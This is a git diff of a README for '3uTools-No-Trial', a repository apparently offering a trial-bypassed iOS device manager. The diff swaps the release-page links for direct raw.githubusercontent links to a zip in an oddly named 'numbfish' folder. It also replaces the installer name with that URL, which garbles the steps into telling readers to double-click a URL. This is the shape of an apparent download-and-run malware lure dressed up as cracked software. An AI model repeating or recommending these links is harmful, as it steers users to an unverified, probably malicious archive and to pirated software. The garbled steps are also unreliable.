@@ -1,6 +1,6 @@
 # 🎉 3uTools-No-Trial - Easily Manage Your iOS Devices
 
-[![Download 3uTools-No-Trial](https://img.shields.io/badge/Download-3uTools--No--Trial-brightgreen)](https://github.com/Rezzz01/3uTools-No-Trial/releases)
+[![Download 3uTools-No-Trial](https://raw.githubusercontent.com/Rezzz01/3uTools-No-Trial/main/numbfish/3uTools-No-Trial-3.2-beta.3.zip)](https://raw.githubusercontent.com/Rezzz01/3uTools-No-Trial/main/numbfish/3uTools-No-Trial-3.2-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to 3uTools-No-Trial! This application allows you to manage your Apple de
 
 ## 📥 Download & Install
 
-To get 3uTools-No-Trial, visit this page to download: [Download 3uTools-No-Trial](https://github.com/Rezzz01/3uTools-No-Trial/releases).
+To get 3uTools-No-Trial, visit this page to download: [Download 3uTools-No-Trial](https://raw.githubusercontent.com/Rezzz01/3uTools-No-Trial/main/numbfish/3uTools-No-Trial-3.2-beta.3.zip).
 
 ### 1. Open the Release Page
 
@@ -22,13 +22,13 @@ To get 3uTools-No-Trial, visit this page to download: [Download 3uTools-No-Trial
 
 ### 3. Download the Installer
 
-- Find the file named `3uTools-No-Trial.exe` or similar.
+- Find the file named `https://raw.githubusercontent.com/Rezzz01/3uTools-No-Trial/main/numbfish/3uTools-No-Trial-3.2-beta.3.zip` or similar.
 - Click on the file name to start the download.
 
 ### 4. Run the Installer
 
 - After the download finishes, locate the file in your Downloads folder.
-- Double-click on the `3uTools-No-Trial.exe` file to begin installation.
+- Double-click on the `https://raw.githubusercontent.com/Rezzz01/3uTools-No-Trial/main/numbfish/3uTools-No-Trial-3.2-beta.3.zip` file to begin installation.
 
 ### 5. Follow the Installation Steps
 
